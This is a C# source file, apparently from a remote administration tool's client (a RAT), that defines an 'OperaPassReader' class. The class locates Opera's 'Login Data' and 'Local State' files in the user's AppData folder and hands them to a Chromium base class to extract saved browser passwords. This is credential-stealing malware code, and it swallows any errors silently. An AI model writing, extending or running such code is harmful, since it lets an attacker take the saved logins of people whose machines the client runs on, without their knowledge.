using RemoteAdmin.Shared;
using System;
using System.Collections.Generic;
using System.IO;

namespace RemoteAdmin.Client.Recovery.Browsers
{
    public class OperaPassReader : ChromiumBase
    {
        /// <inheritdoc />
        public override string ApplicationName => "Opera";

        /// <inheritdoc />
        public override IEnumerable<RecoveredAccount> ReadAccounts()
        {
            try
            {
                string filePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    "Opera Software\\Opera Stable\\Login Data");
                string localStatePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    "Opera Software\\Opera Stable\\Local State");
                return ReadAccounts(filePath, localStatePath);
            }
            catch (Exception)
            {
                return new List<RecoveredAccount>();
            }
        }
    }
}
